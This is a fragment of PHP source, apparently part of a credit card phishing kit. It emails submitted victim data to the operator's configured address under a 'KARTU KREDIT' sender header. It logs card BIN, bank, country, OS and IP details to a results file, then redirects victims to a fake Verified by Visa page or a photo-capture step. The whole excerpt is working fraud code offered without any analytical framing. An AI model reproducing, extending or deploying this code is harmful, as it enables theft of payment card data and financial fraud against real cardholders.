...
set_time_limit(0);
include '../main.php';
$bobo .= "From: KARTU KREDIT <admin@izanami.apps>" . "\r\n";
...
mail($setting['email_result'], $subject, $message, $bobo);
    $empas = $bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["bank"]["name"])." [ $cn - $os - $ip2 ]\n";
    $file = fopen("../result/bin.txt", "a");
    fwrite($file, $empas);
    fclose($file);
...
if($setting['get_vbv'] == 'on') {
        echo "<META HTTP-EQUIV='refresh' content='0; URL=../account/?view=vbv&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."'>";
        exit();
}else if($getphoto == 'on') {
